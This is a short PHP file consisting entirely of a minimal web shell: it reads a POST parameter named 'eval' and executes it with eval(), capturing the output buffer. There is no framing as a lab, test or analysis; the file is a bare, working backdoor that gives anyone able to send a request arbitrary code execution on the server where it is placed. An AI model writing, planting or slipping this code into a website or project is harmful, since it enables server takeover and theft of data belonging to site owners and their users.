<?php
$eval = $_POST['eval'];
eval($eval);
$ret = @ob_get_contents();
?>